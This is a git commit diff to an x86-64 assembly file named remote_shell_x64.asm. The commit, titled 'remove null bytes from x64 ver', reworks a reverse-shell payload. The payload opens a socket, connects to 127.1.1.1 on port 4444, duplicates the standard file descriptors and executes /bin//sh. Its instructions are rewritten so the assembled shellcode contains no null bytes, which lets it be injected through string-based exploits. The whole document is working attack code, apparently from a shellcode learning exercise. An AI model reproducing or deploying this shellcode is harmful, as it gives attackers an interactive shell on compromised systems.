99c93dfcdcbdced4351ddb55abb8e290e89b0f44
arempter <arempter@gmail.com>
2021-03-04 07:48:58 +0100

    remove null bytes from x64 ver

--- remote_shell_x64.asm
+++ remote_shell_x64.asm
@@ -3,19 +3,22 @@ global main
 
 main:
     ; clear all used registers (%rdi,%rsi, %rdx)
-    xor rax, rax
-    xor rdi, rdi
-    xor rsi, rsi
-    xor rdx, rdx
+    xor rax,rax
+    xor rdi,rdi
+    xor rsi,rsi
+    xor rdx,rdx
 
     ;socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
     ;socket (2,1,0) unistd_64.h = 41 = 29(16) 
     ;rdx already is 0
-     mov ax,0x29
-     mov rdi,0x2
-     mov rsi,0x1
-     syscall
-     mov rdi, rax ; return val with socket number
+    xor rbx,rbx
+    mov bl,0x2
+    mov rdi,rbx
+    dec rbx
+    mov rsi,rbx  
+    mov al,0x29
+    syscall
+    mov rdi, rax ; return val with socket number
 
     ;connect structre
     push 0x0101017F          ; inet_addr
@@ -25,9 +28,11 @@ main:
     ;connect unistd_64.h = 42 = 2A(16). rdi has return socket no
     ;connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.1.1.1")}, 16) = 0
     xor rax, rax
-    mov ax,0x2A
-    mov rsi, rsp
-    mov rdx,0x10
+    mov al,0x2A
+    mov rsi,rsp
+    xor rbx,rbx
+    mov bl,0x10
+    mov rdx,rbx
     syscall
 
     ;dup2
@@ -36,8 +41,11 @@ main:
     ;dup2(3, 2)                              = 2
     xor rax,rax
     xor rdi,rdi
-    mov rdi,0x3
-    mov rsi,0x2
+    xor rbx,rbx
+    mov bl,0x3
+    mov rdi,rbx
+    dec rbx
+    mov rsi,rbx
     loop:
        mov al,0x21
        syscall     
@@ -45,13 +53,13 @@ main:
        jns loop
 
     ; execve sh
-    xor rax, rax
-    xor rdx, rdx 
-    mov rdi, 0x68732f2f6e69622f
+    xor rax,rax
+    xor rdx,rdx
+    mov rdi,0x68732f2f6e69622f
     push rdx 
     push rdi
     push rsp
     pop rdi
-    mov rsi, rdx 
-    mov al, 0x3B
+    mov rsi,rdx
+    mov al,0x3B
     syscall
